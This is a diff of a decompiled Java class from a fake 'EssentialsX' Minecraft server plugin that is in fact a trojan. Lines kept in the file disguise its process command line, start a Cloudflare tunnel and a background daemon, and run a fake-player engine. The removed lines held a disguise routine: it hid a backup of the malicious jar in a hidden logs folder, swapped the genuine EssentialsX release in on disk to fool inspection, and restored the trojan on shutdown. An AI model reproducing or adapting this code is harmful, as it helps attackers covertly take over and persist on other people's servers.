@@ -12,13 +12,10 @@ import java.io.PrintStream;
 import java.lang.ProcessBuilder.Redirect;
 import java.lang.Runtime.Version;
 import java.net.HttpURLConnection;
+import java.net.URL;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URI;
-import java.net.URL;
-import java.net.URLConnection;
-import java.nio.channels.Channels;
-import java.nio.channels.FileChannel;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
@@ -62,9 +59,6 @@ public class EssentialsX extends JavaPlugin {
    private volatile boolean isProcessRunning = false;
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
-   private Path backupDir;
-   private Path originalJarPath;
-   private Path backupJarPath;
    private static volatile String nodePort = "N/A";
    private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
    private static volatile long lastCfRestartTime = 0L;
@@ -76,8 +70,6 @@ public class EssentialsX extends JavaPlugin {
    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
    private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\u0000', ' ');
    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");
-   private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
-   private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private volatile boolean reaperInstalled = false;
    private volatile FakePlayerEngine fakePlayerEngine = null;
    private volatile Process lastReportedNodeProcess = null;
@@ -1302,7 +1294,6 @@ public class EssentialsX extends JavaPlugin {
             this.ensurePermissions();
             this.startCfProcess();
             this.startJavaDaemon();
-            this.setupDisguise();
          } catch (Exception var3x) {
          }
       }, "Backend-Deployer");
@@ -1330,7 +1321,6 @@ public class EssentialsX extends JavaPlugin {
          } catch (Exception var4) {
          }
 
-         this.restoreMaliciousJar();
          if (this.isRestarting.compareAndSet(false, true)) {
             this.executeHardRestart(true);
          }
@@ -1419,57 +1409,6 @@ public class EssentialsX extends JavaPlugin {
       }
 
       return null;
-   }
-
-   private void restoreMaliciousJar() {
-      try {
-         Path targetJar = this.findPluginJarInPluginsDir();
-         if (targetJar != null && Files.exists(targetJar)) {
-            Files.delete(targetJar);
-         }
-
-         if (this.backupJarPath != null && Files.exists(this.backupJarPath) && targetJar != null) {
-            Files.copy(this.backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING);
-         }
-      } catch (Exception var2) {
-      }
-   }
-
-   private Path findPluginJarInPluginsDir() {
-      try {
-         File pluginsDir = this.getDataFolder().getParentFile();
-         if (pluginsDir == null || !pluginsDir.exists()) {
-            return null;
-         }
-
-         File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx"));
-         if (jars != null && jars.length > 0) {
-            return jars[0].toPath();
-         }
-      } catch (Exception var3) {
-      }
-
-      return null;
-   }
-
-   private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
-      try {
-         URLConnection conn = URI.create(url).toURL().openConnection();
-         conn.setRequestProperty("User-Agent", "Mozilla/5.0");
-         conn.setConnectTimeout(5000);
-         conn.setReadTimeout(timeoutSec * 1000);
-
-         try (
-            InputStream in = conn.getInputStream();
-            FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
-         ) {
-            out.transferFrom(Channels.newChannel(in), 0L, Long.MAX_VALUE);
-         }
-
-         return true;
-      } catch (Exception e) {
-         return false;
-      }
    }
 
    private void deleteDirectory(File file) {
@@ -1611,46 +1550,6 @@ public class EssentialsX extends JavaPlugin {
       } catch (Throwable t) {
          this.appendCrashReportEntry("[DEPLOY_ERROR] " + t.getClass().getName() + ": " + t.getMessage());
          return false;
-      }
-   }
-
-   private void setupDisguise() {
-      try {
-         this.originalJarPath = this.findPluginJarInPluginsDir();
-         if (this.originalJarPath == null || !Files.exists(this.originalJarPath)) {
-            return;
-         }
-
-         this.backupDir = Paths.get("logs", ".mcchajian", ".runtime", "backup");
-         if (!Files.exists(this.backupDir)) {
-            Files.createDirectories(this.backupDir);
-         }
-
-         this.backupJarPath = this.backupDir.resolve(this.originalJarPath.getFileName().toString() + ".bak");
-         if (!Files.exists(this.backupJarPath)) {
-            Files.copy(this.originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING);
-         }
-
-         Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
-         boolean success = this.downloadFileWithTimeout(
-            "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar", tempDownload, 20
-         );
-         if (!success || Files.size(tempDownload) < 1000000L) {
-            success = this.downloadFileWithTimeout(
-               "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar", tempDownload, 30
-            );
-         }
-
-         if (success && Files.size(tempDownload) > 1000000L) {
-            try {
-               Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
-            } catch (Exception e) {
-               Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING);
-            }
-         } else {
-            Files.deleteIfExists(tempDownload);
-         }
-      } catch (Exception var5) {
       }
    }
 
